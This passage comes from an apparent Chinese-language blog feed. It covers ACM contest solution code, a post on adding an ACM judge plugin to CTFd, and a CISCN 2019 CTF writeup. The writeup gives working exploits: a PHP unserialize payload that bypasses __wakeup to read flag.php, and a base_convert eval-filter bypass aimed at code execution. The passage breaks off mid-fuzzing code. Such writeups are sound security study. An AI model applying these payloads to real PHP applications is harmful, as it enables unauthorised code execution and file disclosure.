class="string">&#x27;:&#x27;</span>.join([<span class="built_in">hex</span>(_)[<span class="number">2</span>:] <span class="keyword">for</span> _ <span class="keyword">in</span> x[j+<span class="number">1</span>:]]))</span><br><span class="line">    s.sort(key=<span class="keyword">lambda</span> x: (<span class="built_in">len</span>(x), x))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Case #%d:&#x27;</span> % (<span class="keyword">case</span>), s[<span class="number">0</span>])</span><br></pre></td></tr></table></figure><p>但是python里头有个all，可以判断一个可遍历对象里头是否都为true</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">T = <span class="built_in">int</span>(<span class="built_in">input</span>())</span><br><span class="line"><span class="keyword">case</span> = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> T&gt;<span class="keyword">case</span>:</span><br><span class="line">    <span class="keyword">case</span>+=<span class="number">1</span></span><br><span class="line">    x = <span class="built_in">input</span>()</span><br><span class="line">    x = [<span class="built_in">hex</span>(<span class="built_in">int</span>(x[i:i+<span class="number">16</span>], <span class="number">2</span>))[<span class="number">2</span>:] </span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(x), <span class="number">16</span>)</span><br><span class="line">    ]</span><br><span class="line">    s = [<span class="string">&#x27;:&#x27;</span>.join(x)]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i+<span class="number">1</span>,<span class="number">8</span>):</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">all</span>(<span class="built_in">map</span>(<span class="keyword">lambda</span> x:x==<span class="string">&#x27;0&#x27;</span>,x[i:j+<span class="number">1</span>])):</span><br><span class="line">                s.append(<span class="string">&#x27;:&#x27;</span>.join(x[:i])+<span class="string">&#x27;::&#x27;</span>+<span class="string">&#x27;:&#x27;</span>.join(x[j+<span class="number">1</span>:]) )</span><br><span class="line">    s.sort(key=<span class="keyword">lambda</span> x:(<span class="built_in">len</span>(x),x))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Case #%d:&#x27;</span>%(<span class="keyword">case</span>),s[<span class="number">0</span>])</span><br></pre></td></tr></table></figure><h3 id="D-Move">D: Move</h3><p>数据毒瘤。。。有多少人的二分都过了。。<br>证明&quot;$f(V)=需要的盒子数$&quot;不单调：<br>首先取体积为V的流体（即$\lim\limits_{n \to \infty}v_1,v_2…v_n$）放满K个盒子，取$v_i, v_j$合并为一个物体，此时$\sum v_i$没变，而多了一个需要的盒子<br>貌似遍历check一遍就能过</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">bool</span> <span class="title">check</span><span class="params">(<span class="type">int</span> V)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">memset</span>(put, <span class="number">0</span>, <span class="built_in">sizeof</span>(<span class="type">bool</span>) * n);</span><br><span class="line">    <span class="type">int</span> cnt_obj = n, cnt = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (sumV) &#123;</span><br><span class="line">        <span class="type">int</span> cur = V;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++)</span><br><span class="line">            <span class="keyword">if</span> (!put[i] &amp;&amp; v[i] &lt;= cur) &#123;</span><br><span class="line">                put[i] = <span class="literal">true</span>;</span><br><span class="line">                cnt_obj--;</span><br><span class="line">                cur -= v[i];</span><br><span class="line">            &#125;</span><br><span class="line">        cnt++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> cnt &lt;= k;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;WIP&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;第三场&quot;&gt;第三场&lt;/h2&gt;
&lt;h3 id=&quot;B-Crazy-Binary-String&quot;&gt;B: Crazy Binary String&lt;/h3&gt;
&lt;p&gt;签到题&lt;br&gt;
初步想法是$v_i$</summary>
      
    
    
    
    <category term="ACM" scheme="https://blog.frankli.site/categories/ACM/"/>
    
    
    <category term="牛客多校" scheme="https://blog.frankli.site/tags/%E7%89%9B%E5%AE%A2%E5%A4%9A%E6%A0%A1/"/>
    
    <category term="ACM" scheme="https://blog.frankli.site/tags/ACM/"/>
    
  </entry>
  
  <entry>
    <title>给CTFd加上ACM评测功能</title>
    <link href="https://blog.frankli.site/2019/07/25/Dev/%E7%BB%99CTFd%E5%8A%A0%E4%B8%8AACM%E8%AF%84%E6%B5%8B%E5%8A%9F%E8%83%BD/"/>
    <id>https://blog.frankli.site/2019/07/25/Dev/%E7%BB%99CTFd%E5%8A%A0%E4%B8%8AACM%E8%AF%84%E6%B5%8B%E5%8A%9F%E8%83%BD/</id>
    <published>2019-07-24T16:00:00.000Z</published>
    <updated>2025-10-19T20:34:40.714Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>闲得蛋疼.jpg</p></blockquote><p>去年参加西电办的中学生CTF嫖了五千块钱，今年就能来西电办中学生CTF.jpg，真实的一批</p><p>去年的ACM题是直接起了个hustoj(我记得)，这样就需要工作人员不断地检查榜单并且手动发放flag，工作量大且效率低。于是我就来整个CTFdOJ，交的代码AC了自动加分。</p><h2 id="前置">前置</h2><h3 id="CTFd-plugin">CTFd plugin</h3><p>与其说是“魔改CTFd”不如说“给CTFd整个插件”<br>CTFd自带的动态积分题目就是一个典型的插件。这个插件给CTFd添加了一种题目。<br>那么添加“ACM题目类型”理所当然也应该写成一个插件</p><h3 id="沙箱的选择">沙箱的选择</h3><p>评测沙箱需要用来控制程序的行为，而且是OJ的核心部件，要精确统计程序的运行时间/空间占用信息。<br>由于有很多现成的，那我就找一个拿来用吧<br>综合功能和LICENSE等多种因素，最终选择了QDOJ的Judger</p><h3 id="一些决定">一些决定</h3><ul><li>将评测机与CTFd分离开来。<ul><li>考虑到CTFd只是一个题目平台，并不应该负责繁重的计算任务</li><li>将评测机和平台放在一起有修改成绩的隐患</li></ul></li><li>做安全的同学大概对Python更加熟悉，于是支持对Python程序的评测</li><li>通过配置文件能随时添加新的语言支持</li></ul><h2 id="撸代码">撸代码</h2><h3 id="plugin">plugin</h3><pre><code>负责添加/展示/设置题目，并在评测正确时为相应队伍加上对应的分数</code></pre><p>折腾了半天。。。推翻了以前越写越复杂还要改CTFd自己的数据库的写法以后重做了这个东西：<a href="https://github.com/frankli0324/CTFd-ICPC-challenges">ICPC Plugin</a></p><h3 id="translation-layer">translation layer</h3><pre><code>主要负责接受来自CTFd plugin的评测请求缓存测试用例，避免每次都要把40多M的input/output重新发一遍</code></pre><p>由于需要不同的功能，还是用flask方便一点。通过不同的URL来定位不同的功能。<br>于是有了<a href="https://github.com/frankli0324/JudgeServer">JudgeServer</a><br>对于不同的语言支持，可以在worker.json中配置。其中可以配置编译命令，执行命令，并且通过向命令中注入变量来控制细节。<br>解释型语言不写编译命令就是了。</p><h3 id="translation-layer-权限控制">translation layer::权限控制</h3><p>ACM沙箱最头疼的就是权限。<br>首先，用了别人的沙箱，可以丢过给别人。<br>其次，这货跑在docker里头，断了外网。希望可以一劳永逸。<br>还有，具体的权限控制<strong>假定</strong>都能通过命令行参数完成。比如<br>java的<code>-Djava.security.manager</code>选项<br>Python可以跑在venv里头</p><h2 id="总体流程">总体流程</h2><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">                   +--------+            +--------+</span><br><span class="line">       +-----------+        |            |        |</span><br><span class="line">       |     R     |        |     1      |        |</span><br><span class="line">       v           |        +------------&gt;        |</span><br><span class="line">+------+---+       |        |            |        |</span><br><span class="line">|          |       |        &lt;------------+        |</span><br><span class="line">|contestant|       |  CTFd  |     2      | Judger |</span><br><span class="line">|          |       | Plugin |            |        |</span><br><span class="line">+------+---+       |        |            |        |</span><br><span class="line">       |           |        |     3      |        |</span><br><span class="line">       |     S     |        +------------&gt;        |</span><br><span class="line">       +----------&gt;+        |            |        |</span><br><span class="line">                   +--------+            +--------+</span><br></pre></td></tr></table></figure><p>上图中1、2、3分别表示CTFd在接收到一次submission(S)后与Judger可能的三种行为</p><table><thead><tr><th>code</th><th>action</th></tr></thead><tbody><tr><td>1</td><td>发送代码+题目id+语言，进行评测</td></tr><tr><td>2</td><td>返回评测结果与评测过的最后一组数据的运行情况</td></tr><tr><td>3</td><td>发送题目测试用例的URL<sup><strong>todo</strong></sup>+设定的资源限制，缓存题目评测信息</td></tr></tbody></table><p>在收到一次Submission(S)后，Plugin首先尝试进行<code>1</code>。<br>如果Judger此时并没有缓存过这个题目，则会返回评测错误，此时Plugin会尝试进行<code>3</code>，Judger则会缓存当前题目<br>Plugin执行完<code>3</code>后会再次尝试<code>1</code>。</p><blockquote><p>真是憨憨，自嗨行为</p></blockquote><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;闲得蛋疼.jpg&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;去年参加西电办的中学生CTF嫖了五千块钱，今年就能来西电办中学生CTF.jpg，真实的一批&lt;/p&gt;
&lt;p&gt;去年的ACM题是直接起了个hustoj(我记得)，这样就需要工作人员不断地检查榜单</summary>
      
    
    
    
    
    <category term="DevOps" scheme="https://blog.frankli.site/tags/DevOps/"/>
    
    <category term="Misc" scheme="https://blog.frankli.site/tags/Misc/"/>
    
  </entry>
  
  <entry>
    <title>第十二届全国大学生信息安全竞赛西北赛区 部分题目 Writeup</title>
    <link href="https://blog.frankli.site/2019/04/22/Security/Writeup/CISCN%202019/"/>
    <id>https://blog.frankli.site/2019/04/22/Security/Writeup/CISCN%202019/</id>
    <published>2019-04-21T16:00:00.000Z</published>
    <updated>2025-10-19T20:31:24.311Z</updated>
    
    <content type="html"><![CDATA[<h2 id="JustSoso">JustSoso</h2><div class='spoiler collapsed'>    <div class='spoiler-title'>        题目源码    </div>    <div class='spoiler-content'>        <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line"><span class="variable">$payload</span> = <span class="variable">$_GET</span>[<span class="string">&quot;payload&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Missing parameter&#x27;</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/&quot;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hack attacked!!!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">@<span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$payload</span>))&#123;</span><br><span class="line">    <span class="variable">$url</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_URI&#x27;</span>]);</span><br><span class="line">    <span class="title function_ invoke__">parse_str</span>(<span class="variable">$url</span>[<span class="string">&#x27;query&#x27;</span>],<span class="variable">$query</span>);</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$query</span> <span class="keyword">as</span> <span class="variable">$value</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/&quot;</span>,<span class="variable">$value</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;stop hacking!&#x27;</span>);</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$payload</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$payload</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&quot;Missing parameters&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!--Please test index.php?file=xxx.php --&gt;</span><br><span class="line">&lt;!--Please get the source of hint.php--&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// hint.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Handle</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$handle</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="title function_ invoke__">get_object_vars</span>(<span class="variable">$this</span>) <span class="keyword">as</span> <span class="variable">$k</span> =&gt; <span class="variable">$v</span>) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="variable">$k</span> = <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Waking up\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$handle</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;handle = <span class="variable">$handle</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;handle-&gt;<span class="title function_ invoke__">getFlag</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token_flag</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;file = <span class="variable">$file</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;token_flag = <span class="variable language_">$this</span>-&gt;token = <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">rand</span>(<span class="number">1</span>,<span class="number">10000</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;token_flag = <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">rand</span>(<span class="number">1</span>,<span class="number">10000</span>));</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;asdf&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;token === <span class="variable language_">$this</span>-&gt;token_flag)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;file))&#123;</span><br><span class="line">                <span class="keyword">echo</span> @<span class="title function_ invoke__">highlight_file</span>(<span class="variable">$this</span>-&gt;file,<span class="literal">true</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>    </div></div><p>GET参数中含有file, LFI获得index.php源码, 根据其内容继续获得hint.php源码<br>发现含有unserialize函数, 联系hint.php内容, 考察点为反序列化</p><p>有三处需要绕过:</p><ol><li>parse_url 三斜杠绕过, 常规</li><li><code>__wakeup</code> 绕过，<a href="https://bugs.php.net/bug.php?id=72663">CVE-2016-7124</a></li><li>每次调用getFlag token_flag都会随机变化，可以将token赋值为token_flag 的引用绕过</li></ol><img src="/2019/04/22/Security/Writeup/CISCN%202019/EUhNFz4.png" class="" title="Source"><p>故exploit如下:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Handle</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$handle</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$xx</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;handle = <span class="variable">$xx</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$p</span> = <span class="keyword">new</span> <span class="title class_">Flag</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="variable">$p</span>-&gt;token = &amp;<span class="variable">$p</span>-&gt;token_flag;</span><br><span class="line"><span class="variable">$p</span>-&gt;file = <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="variable">$pay</span> = <span class="keyword">new</span> <span class="title class_">Handle</span>(<span class="variable">$p</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$pay</span>));</span><br></pre></td></tr></table></figure><h2 id="love-the-math">love the math</h2><div class='spoiler collapsed'>    <div class='spoiler-title'>        题目源码    </div>    <div class='spoiler-content'>        <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// calc.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//听说你很喜欢数学，不知道你是否爱它胜过爱flag</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="comment">//例子 c=20-1</span></span><br><span class="line">    <span class="variable">$content</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$content</span>) &gt;= <span class="number">80</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;太长了不会算&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$blacklist</span> = [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;\[&#x27;</span>, <span class="string">&#x27;\]&#x27;</span>];</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackitem</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&#x27;</span> . <span class="variable">$blackitem</span> . <span class="string">&#x27;/m&#x27;</span>, <span class="variable">$content</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;请不要输入奇奇怪怪的字符&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;echo &#x27;</span>.<span class="variable">$content</span>.<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">    <span class="comment">//常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp</span></span><br><span class="line">    <span class="variable">$whitelist</span> = [<span class="string">&#x27;abs&#x27;</span>, <span class="string">&#x27;acos&#x27;</span>, <span class="string">&#x27;acosh&#x27;</span>, <span class="string">&#x27;asin&#x27;</span>, <span class="string">&#x27;asinh&#x27;</span>, <span class="string">&#x27;atan2&#x27;</span>, <span class="string">&#x27;atan&#x27;</span>, <span class="string">&#x27;atanh&#x27;</span>, <span class="string">&#x27;base_convert&#x27;</span>, <span class="string">&#x27;bindec&#x27;</span>, <span class="string">&#x27;ceil&#x27;</span>, <span class="string">&#x27;cos&#x27;</span>, <span class="string">&#x27;cosh&#x27;</span>, <span class="string">&#x27;decbin&#x27;</span>, <span class="string">&#x27;dechex&#x27;</span>, <span class="string">&#x27;decoct&#x27;</span>, <span class="string">&#x27;deg2rad&#x27;</span>, <span class="string">&#x27;exp&#x27;</span>, <span class="string">&#x27;expm1&#x27;</span>, <span class="string">&#x27;floor&#x27;</span>, <span class="string">&#x27;fmod&#x27;</span>, <span class="string">&#x27;getrandmax&#x27;</span>, <span class="string">&#x27;hexdec&#x27;</span>, <span class="string">&#x27;hypot&#x27;</span>, <span class="string">&#x27;is_finite&#x27;</span>, <span class="string">&#x27;is_infinite&#x27;</span>, <span class="string">&#x27;is_nan&#x27;</span>, <span class="string">&#x27;lcg_value&#x27;</span>, <span class="string">&#x27;log10&#x27;</span>, <span class="string">&#x27;log1p&#x27;</span>, <span class="string">&#x27;log&#x27;</span>, <span class="string">&#x27;max&#x27;</span>, <span class="string">&#x27;min&#x27;</span>, <span class="string">&#x27;mt_getrandmax&#x27;</span>, <span class="string">&#x27;mt_rand&#x27;</span>, <span class="string">&#x27;mt_srand&#x27;</span>, <span class="string">&#x27;octdec&#x27;</span>, <span class="string">&#x27;pi&#x27;</span>, <span class="string">&#x27;pow&#x27;</span>, <span class="string">&#x27;rad2deg&#x27;</span>, <span class="string">&#x27;rand&#x27;</span>, <span class="string">&#x27;round&#x27;</span>, <span class="string">&#x27;sin&#x27;</span>, <span class="string">&#x27;sinh&#x27;</span>, <span class="string">&#x27;sqrt&#x27;</span>, <span class="string">&#x27;srand&#x27;</span>, <span class="string">&#x27;tan&#x27;</span>, <span class="string">&#x27;tanh&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">preg_match_all</span>(<span class="string">&#x27;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#x27;</span>, <span class="variable">$content</span>, <span class="variable">$used_funcs</span>);</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$used_funcs</span>[<span class="number">0</span>] <span class="keyword">as</span> <span class="variable">$func</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$func</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;请不要输入奇奇怪怪的函数&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//帮你算出答案</span></span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;echo &#x27;</span>.<span class="variable">$content</span>.<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>    </div></div><p>观察发现如下限制:</p><ol><li>payload长度不可超过80</li><li>可以执行任何数学函数</li><li>有部分字符不可用( <code>$blacklist</code> )</li></ol><p>由于80这个长度太短, 所以后期应当是通过取其它位置的可控输入点进行执行和输出<br>应当取能够返回字符串的数学函数, 加以拼接得到期望值<br>题目过滤了所有除数学函数名意外的英文字符, 所以应当利用纯数字构造payload</p><p>观察数学函数的输入输出, 发现涉及到不同进制的数学函数能够返回字符串。<br>其中利用base_convert能获取更大的字符集, 但也更长<br>原型：<code>base_convert(number,frombase,tobase)</code><br>可以将字符串转为10进制或其它能够组成纯数字的进制来控制输入</p><p>验证: <code>url:/calc.php?c=base_convert(55490343972,10,36)()</code><br>可以执行phpinfo</p><p>比赛时受师傅的引导，将echo file_get_contents缩短为readfile，成功获得了flag</p><img src="/2019/04/22/Security/Writeup/CISCN%202019/SlwlDOA.png" class="" title="meme"><p>其实应该是可以RCE的</p><blockquote><p>php &gt; <code>echo base_convert('system', 36, 10);</code><br>1751504350</p></blockquote><p>考虑到进制转换只能转出小写字母, 此处利用php能将字符串互相异或的行为, 能够将多个16进制串进行异或得到大写字母。<br>于是目的是：将两个<code>[a-z0-9]*</code>字符串异或得到<code>_GET</code>,利用<code>_GET&#123;param&#125;</code>获取到另一参数中引入的更长字串<br>进行fuzz, fuzz代码:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$table</span> = <span class="string">&quot;0123456789abcdefghijklmnopqrstuvwxyz&quot;</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">36</span>; <span class="variable">$i</span>++)&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$j</span> = <span class="variable">$i</span>; <span 